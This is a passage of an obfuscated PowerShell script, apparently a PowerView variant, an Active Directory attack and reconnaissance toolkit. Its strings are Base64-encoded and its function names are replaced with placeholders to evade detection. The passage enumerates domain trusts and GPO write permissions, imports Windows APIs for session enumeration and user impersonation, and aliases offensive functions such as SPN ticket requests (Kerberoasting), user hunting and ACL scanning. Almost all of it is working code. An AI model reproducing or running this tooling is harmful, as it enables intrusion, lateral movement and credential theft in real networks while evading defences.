    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${37}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${37}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${37}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
        ${39} = (f69 -Credential $Credential).Name
    }
    else {
        ${39} = (f69).Name
    }
    ${32}.Push(${39})
    while(${32}.Count -ne 0) {
        $Domain = ${32}.Pop()
        if ($Domain -and ($Domain.Trim() -ne '') -and (-not ${38}.ContainsKey($Domain))) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABNAGEAcABwAGkAbgBnAF0AIABFAG4AdQBtAGUAcgBhAHQAaQBuAGcAIAB0AHIAdQBzAHQAcwAgAGYAbwByACAAZABvAG0AYQBpAG4AOgAgACcAJABEAG8AbQBhAGkAbgAnAA==')))
            $Null = ${38}.Add($Domain, '')
            try {
                ${37}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
                ${35} = f68 @37
                if (${35} -isnot [System.Array]) {
                    ${35} = @(${35})
                }
                if ($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))) {
                    ${36} = @{}
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${36}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${36}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    ${35} += f67 @36
                }
                if (${35}) {
                    if (${35} -isnot [System.Array]) {
                        ${35} = @(${35})
                    }
                    ForEach (${34} in ${35}) {
                        if (${34}.SourceName -and ${34}.TargetName) {
                            $Null = ${32}.Push(${34}.TargetName)
                            ${34}
                        }
                    }
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABNAGEAcABwAGkAbgBnAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
            }
        }
    }
}
function Get-GPODelegation {
    [CmdletBinding()]
    Param (
        [String]
        $GPOName = '*',
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    ${29} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBZAFMAVABFAE0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AIABBAGQAbQBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAZQByAHAAcgBpAHMAZQAgAEEAZABtAGkAbgBzAA=='))))
    $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    ${33} = @($Forest.Domains)
    ${32} = ${33} | foreach { $_.GetDirectoryEntry() }
    foreach ($Domain in ${32}) {
        $Filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwAFAAbwBsAGkAYwB5AEMAbwBuAHQAYQBpAG4AZQByACkAKABkAGkAcwBwAGwAYQB5AG4AYQBtAGUAPQAkAEcAUABPAE4AYQBtAGUAKQApAA==')))
        ${31} = New-Object System.DirectoryServices.DirectorySearcher
        ${31}.SearchRoot = $Domain
        ${31}.Filter = $Filter
        ${31}.PageSize = $PageSize
        ${31}.SearchScope = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAdAByAGUAZQA=')))
        ${30} = ${31}.FindAll()
        foreach (${28} in ${30}){
            ${27} = ([ADSI]${28}.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAA=='))) -and $_.AccessControlType -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA=='))) -and  ${29} -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAEUAQQBUAE8AUgAgAE8AVwBOAEUAUgA=')))}
        if (${27} -ne $null){
            ${26} = New-Object psobject
            ${26} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAFMAUABhAHQAaAA='))) ${28}.Properties.adspath
            ${26} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${28}.Properties.displayname
            ${26} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAA=='))) ${27}.IdentityReference
            ${26} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) ${27}.ActiveDirectoryRights
            ${26}
        }
        }
    }
}
${7} = f66 -f60 Win32
${25} = f65 ${7} PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMAA=')))
    GROUP_OBJECT                    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMAA=')))
    NON_SECURITY_GROUP_OBJECT       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMQA=')))
    ALIAS_OBJECT                    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMAA=')))
    NON_SECURITY_ALIAS_OBJECT       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMQA=')))
    USER_OBJECT                     =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADMAMAAwADAAMAAwADAAMAA=')))
    MACHINE_ACCOUNT                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADMAMAAwADAAMAAwADAAMQA=')))
    TRUST_ACCOUNT                   =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADMAMAAwADAAMAAwADAAMgA=')))
    APP_BASIC_GROUP                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMAA=')))
    APP_QUERY_GROUP                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMQA=')))
    ACCOUNT_TYPE_MAX                =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADcAZgBmAGYAZgBmAGYAZgA=')))
}
${24} = f65 ${7} PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA=')))
    GLOBAL_SCOPE                    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA=')))
    DOMAIN_LOCAL_SCOPE              =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA=')))
    UNIVERSAL_SCOPE                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA=')))
    APP_BASIC                       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA=')))
    APP_QUERY                       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA=')))
    SECURITY                        =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADgAMAAwADAAMAAwADAAMAA=')))
} -f50
${23} = f65 ${7} PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -f50
${21} = f65 ${7} WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}
${22} = f64 ${7} PowerView.RDPSessionInfo @{
    ExecEnvId = f63 0 UInt32
    State = f63 1 ${21}
    SessionId = f63 2 UInt32
    pSessionName = f63 3 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pHostName = f63 4 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pUserName = f63 5 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pDomainName = f63 6 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pFarmName = f63 7 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${20} = f64 ${7} WTS_CLIENT_ADDRESS @{
    AddressFamily = f63 0 UInt32
    Address = f63 1 Byte[] -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AFYAYQBsAEEAcgByAGEAeQA='))), 20)
}
${19} = f64 ${7} PowerView.ShareInfo @{
    Name = f63 0 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Type = f63 1 UInt32
    Remark = f63 2 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${18} = f64 ${7} PowerView.LoggedOnUserInfo @{
    UserName = f63 0 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    LogonDomain = f63 1 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    AuthDomains = f63 2 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    LogonServer = f63 3 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${17} = f64 ${7} PowerView.SessionInfo @{
    CName = f63 0 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    UserName = f63 1 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Time = f63 2 UInt32
    IdleTime = f63 3 UInt32
}
${14} = f65 ${7} SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}
${16} = f64 ${7} LOCALGROUP_INFO_1 @{
    lgrpi1_name = f63 0 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lgrpi1_comment = f63 1 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${15} = f64 ${7} LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = f63 0 IntPtr
    lgrmi2_sidusage = f63 1 ${14}
    lgrmi2_domainandname = f63 2 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${12} = f65 ${7} DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -f50
${11} = f65 ${7} DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
${10} = f65 ${7} DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}
${13} = f64 ${7} DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = f63 0 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    DnsDomainName = f63 1 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Flags = f63 2 ${12}
    ParentIndex = f63 3 UInt32
    TrustType = f63 4 ${11}
    TrustAttributes = f63 5 ${10}
    DomainSid = f63 6 IntPtr
    DomainGuid = f63 7 Guid
}
${9} = f64 ${7} NETRESOURCEW @{
    dwScope =         f63 0 UInt32
    dwType =          f63 1 UInt32
    dwDisplayType =   f63 2 UInt32
    dwUsage =         f63 3 UInt32
    lpLocalName =     f63 4 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lpRemoteName =    f63 5 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lpComment =       f63 6 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lpProvider =      f63 7 String -f44 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${8} = @(
    (f62 netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (f62 netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (f62 netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (f62 netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (f62 netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (f62 netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (f62 netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (f62 netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (f62 advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -f56),
    (f62 advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -f56),
    (f62 advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (f62 advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -f56),
    (f62 advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -f56),
    (f62 advapi32 RevertToSelf ([Bool]) @() -f56),
    (f62 wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (f62 wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -f56),
    (f62 wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -f56),
    (f62 wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (f62 wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (f62 wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (f62 Mpr WNetAddConnection2W ([Int]) @(${9}, [String], [String], [UInt32])),
    (f62 Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (f62 kernel32 CloseHandle ([Bool]) @([IntPtr]) -f56)
)
${1} = ${8} | f61 -f48 ${7} -f59 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAA==')))
${6} = ${1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAYQBwAGkAMwAyAA==')))]
${5} = ${1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHYAYQBwAGkAMwAyAA==')))]
${4} = ${1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwB0AHMAYQBwAGkAMwAyAA==')))]
${3} = ${1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBwAHIA')))]
${2} = ${1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAA==')))]
sal Get-IPAddress Resolve-IPAddress
sal Convert-NameToSid ConvertTo-SID
sal Convert-SidToName ConvertFrom-SID
sal Request-SPNTicket Get-DomainSPNTicket
sal Get-DNSZone Get-DomainDNSZone
sal Get-DNSRecord Get-DomainDNSRecord
sal Get-NetDomain Get-Domain
sal Get-NetDomainController Get-DomainController
sal Get-NetForest Get-Forest
sal Get-NetForestDomain Get-ForestDomain
sal Get-NetForestCatalog Get-ForestGlobalCatalog
sal Get-NetUser Get-DomainUser
sal Get-UserEvent Get-DomainUserEvent
sal Get-NetComputer Get-DomainComputer
sal Get-ADObject Get-DomainObject
sal Set-ADObject Set-DomainObject
sal Get-ObjectAcl Get-DomainObjectAcl
sal Add-ObjectAcl Add-DomainObjectAcl
sal Invoke-ACLScanner Find-InterestingDomainAcl
sal Get-GUIDMap Get-DomainGUIDMap
sal Get-NetOU Get-DomainOU
sal Get-NetSite Get-DomainSite
sal Get-NetSubnet Get-DomainSubnet
sal Get-NetGroup Get-DomainGroup
sal Find-ManagedSecurityGroups Get-DomainManagedSecurityGroup
sal Get-NetGroupMember Get-DomainGroupMember
sal Get-NetFileServer Get-DomainFileServer
sal Get-DFSshare Get-DomainDFSShare
sal Get-NetGPO Get-DomainGPO
sal Get-NetGPOGroup Get-DomainGPOLocalGroup
sal Find-GPOLocation Get-DomainGPOUserLocalGroupMapping
sal Find-GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping
sal Get-LoggedOnLocal Get-RegLoggedOn
sal Invoke-CheckLocalAdminAccess Test-AdminAccess
sal Get-SiteName Get-NetComputerSiteName
sal Get-Proxy Get-WMIRegProxy
sal Get-LastLoggedOn Get-WMIRegLastLoggedOn
sal Get-CachedRDPConnection Get-WMIRegCachedRDPConnection
sal Get-RegistryMountedDrive Get-WMIRegMountedDrive
sal Get-NetProcess Get-WMIProcess
sal Invoke-ThreadedFunction New-ThreadedFunction
sal Invoke-UserHunter Find-DomainUserLocation
sal Invoke-ProcessHunter Find-DomainProcess
sal Invoke-EventHunter Find-DomainUserEvent
sal Invoke-ShareFinder Find-DomainShare
sal Invoke-FileFinder Find-InterestingDomainShareFile
sal Invoke-EnumerateLocalAdmin Find-DomainLocalGroupMember
sal Get-NetDomainTrust Get-DomainTrust
sal Get-NetForestTrust Get-ForestTrust
sal Find-ForeignUser Get-DomainForeignUser
sal Find-ForeignGroup Get-DomainForeignGroupMember
sal Invoke-MapDomainTrust Get-DomainTrustMapping
sal Get-DomainPolicy Get-DomainPolicyData
